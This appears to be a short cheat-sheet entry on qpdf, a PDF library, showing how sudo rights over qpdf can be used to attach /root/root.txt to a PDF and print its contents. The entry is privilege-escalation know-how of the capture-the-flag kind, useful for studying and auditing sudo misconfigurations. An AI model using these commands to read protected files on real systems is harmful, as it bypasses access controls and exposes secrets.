qpdf

qpdf is a program and C++ library for structural, content-preserving transformations on PDF files.qpdf provides many useful capabilities to developers of PDF-producing software or for people who just want to look at the innards of a PDF file to learn more about how they work.

Usage

    File attachment

    You can use file attachment with qpdf in order to view content of system files

    Using an existing blank pdf (Download from internet) we can attach the file we want (just in case we have root privielge over qpdf)

    sudo qpdf blank.pdf --add-attachment "/root/root.txt" -- output.pdf

    You can check if the file was attached

    sudo qpdf --list-attachments output.pdf

    Show the contents of the file attached

    sudo qpdf --show-attachment=root.txt output.pdf
